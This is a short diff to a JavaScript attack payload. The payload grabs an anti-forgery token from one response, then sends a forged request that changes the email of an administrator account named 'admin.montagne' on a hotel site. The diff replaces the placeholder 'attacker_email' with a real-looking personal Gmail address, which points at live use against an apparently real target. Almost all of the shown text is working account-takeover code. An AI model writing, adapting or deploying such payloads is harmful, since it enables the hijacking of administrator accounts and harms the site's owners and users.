@@ -8,7 +8,7 @@ req.onload = function handleFirstResponse() {
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/users/details/503/edit', true);
     changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    changeReq.send('ViewModel.Id=503&ViewModel.UserName=admin.montagne&ViewModel.CompanyLabel=Hotel+Montagne+SFPMEI&ViewModel.FirstName=admin&ViewModel.LastName=montagne&ViewModel.Email=attacker_email&ViewModel.PhoneNumber=0000000000&ViewModel.Culture=en&ViewModel.NewsletterSubscribed=false&__RequestVerificationToken=' + token);
+    changeReq.send('ViewModel.Id=503&ViewModel.UserName=admin.montagne&ViewModel.CompanyLabel=Hotel+Montagne+SFPMEI&ViewModel.FirstName=admin&ViewModel.LastName=montagne&ViewModel.Email=akberbadsha05%40gmail.com&ViewModel.PhoneNumber=0000000000&ViewModel.Culture=en&ViewModel.NewsletterSubscribed=false&__RequestVerificationToken=' + token);
 
     // Now trigger the second request
     var req2 = new XMLHttpRequest();
